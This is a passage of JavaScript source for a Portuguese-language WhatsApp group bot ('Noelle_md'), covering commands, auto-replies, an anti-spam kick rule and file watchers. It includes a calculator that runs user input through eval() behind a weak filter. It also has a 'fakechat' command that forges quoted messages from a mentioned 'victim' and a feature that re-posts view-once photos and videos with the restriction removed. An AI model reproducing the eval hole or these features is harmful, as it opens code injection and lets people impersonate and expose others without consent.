caption:`      ❗ IDEIA DE COMADO ❗\nUSUARIO: @${sender.split('@')[0]},\nCOMADO: ${q}`,
footer: 'Noelle_md'
}
amy.sendMessage("559691542453@s.whatsapp.net",templateMessage)
break

case 'calculadora':
case 'calcular':  
case 'calc':
rsp = q.replace("x", "*").replace('"', ":").replace(new RegExp("[()abcdefghijklmnopqrstwuvxyz]", "gi"), "").replace("÷", "/")
return escrever(JSON.stringify(eval(rsp, null,'\t')))
break

case 'calendario':
case 'calendário':
case 'dados':
var getGroups = await amy.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
ingfoo.sort((a, b) => (a[0] < b.length))
hora16 = moment.tz('America/Sao_Paulo').format('HH:mm')
date16 = moment.tz('America/Sao_Paulo').format('DD/MM')
reply(`
*${tempo.toUpperCase()}*
👤 ${pushname}

👥 *GRUPO:* ${isGroup ? groupName : "privado"}
📆 *DATA:* ${date16}
⏰ *HORA:* ${hora16}
🤖 *BOT:* ${botName}
👑 *DONO:* ${donoName}


`)
break

case 'fakechat': case 'fakemsg':
if(!isGroup) return reply(`SO GRUPOS`);
var [repplace, tarrget, bott] = q.split("/")
var m_ = info.message.extendedTextMessage && info.message.extendedTextMessage.contextInfo && info.message.extendedTextMessage.contextInfo.mentionedJid ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : null
if (m_ && tarrget && bott) {
amy.sendMessage(from, {text: `${bott}`}, {quoted: {key: {fromMe: false, participant: `${m_}`}, message: {conversation: `${tarrget}`}}});
} else {
reply(`Crie mensagens fakes com qualquer uma pessoa! Explicando abaixo:\n—\n• Você precisaria mencionar a pessoa e adicionar a mensagem que ele supostamente iria reply e que você responderia a seguinte mensagem, todos usando a */* para separar o que foi pedido dito nesse textinho...\n• *Ex:* ${prefix+command} @vitima/msg1/msg2`);
}
break;

default:
if(isCmd) {
reagir(from,"💢")
}

if(budy.includes("gpt") || budy.includes("Gpt")) {

if(!q) return reagir(from, "❔")

gpt = await fetchJson(`https://api.cariflex.xyz/api/ai/gpt?query=${q}`)

const gpts = require('./arquivos/funcoes/gtts')('pt')

ranm = getRandom('.mp3')

rano = getRandom('.ogg')

gpts.save(ranm, `${gpt.resposta}`, function() {

exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {

amy.sendMessage(from, {audio: fs.readFileSync(ranm), ptt:true, mimetype: "audio/mpeg"}, {quoted: info})

DLT_FL(ranm)
DLT_FL(rano)
})
})

}

if(budy.includes('@5596991542453') || (budy.includes('@559691542453'))){

await amy.sendMessage(from, {react: {text: `😁`, key: info.key}})

reply("Meu dono logo ira responder voce 🥰.")
}



if(isX9VisuUnica) {

if(info.message?.viewOnceMessageV2 || type == "viewOnceMessage") {

if(JSON.stringify(info).includes("videoMessage")) {

var px = info.message?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessage?.message?.videoMessage

px.viewOnce = false

px.video = {url: px.url}

px.caption +=`Revelando video de visualização unica enviado por  [ ${pushname} ] 😈`

amy.sendMessage(from,px)

} else {

var px = info.message?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessage?.message?.imageMessage

px.viewOnce = false

px.image = {url: px.url}

px.caption += `Revelando imagem de visualização unica enviada por  [ ${pushname}  ] 😈 `

amy.sendMessage(from,px)

}}}

var budy2 = body.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");
        
const isBot = info.key.fromMe ? true : false

if(isAntiNotas && body.toString().match(/(💳|🌨️|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi) && isBotAdmins) {

if(type == 'stickerMessage') return
let verificar = body.toString().match(/(💳|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi)

if (verificar && body.length < 100) return

if(isGroupAdmins) return amy.sendMessage(from, {text:'Nao irei remover pois e adm'}, {quoted: info})  

await amy.sendMessage(from, {text: `Ola ${pushname} Você enviou uma mensagem proibida entao irei removelo`}, {quoted: info}) 

setTimeout(async function () {
amy.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}          

if(budy.includes('prefixo') || (budy.includes('Prefixo'))){
reply(`${tempo} ${pushname} aqui esta o meu prefix『 ${prefix} 』`)
}

if(budy.includes('🔑')){
try {
await sleep(2000)
eu = await fetchJson(`https://api.cariflex.xyz/api/keyerrada?apikey=cariflex-key`)
reagir(from, "🆙")
 amy.sendMessage(from, {text: `${eu.message}\n${eu.request}`}, {quoted: info})
} catch (error) {
reagir(from, "❌")
}
}

}} catch (erro) {
console.log(erro)
}}) 

amy.ev.on('connection.update', (update) => {
const { connection, lastDisconnect } = update
if(lastDisconnect === undefined) {

}

if(connection === 'close') {
var shouldReconnect = (lastDisconnect.error.Boom)?.output?.statusCode !== DisconnectReason.loggedOut  
ligarbot()
}})}
ligarbot()

fs.watchFile('./menus/alugar.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('O Menu foi editada, irei reiniciar...');
process.exit()
}
})

fs.watchFile('./menus/menudono.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('O Menu foi editada, irei reiniciar...');
process.exit()
}
})

fs.watchFile('./menus/menu.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('O Menu foi editada, irei reiniciar...');
process.exit()
}
})

fs.watchFile('./start.sh', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('O start.sh foi editada, irei reiniciar...');
process.exit()
}
})

fs.watchFile('./dono.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('A index foi editada, irei reiniciar...');
process.exit()
}
})

fs.watchFile('./index.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('A index foi editada, irei reiniciar...');
process.exit()
}
})

fs.watchFile('./config.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('A config foi editada, irei reiniciar...');
process.exit()
}
})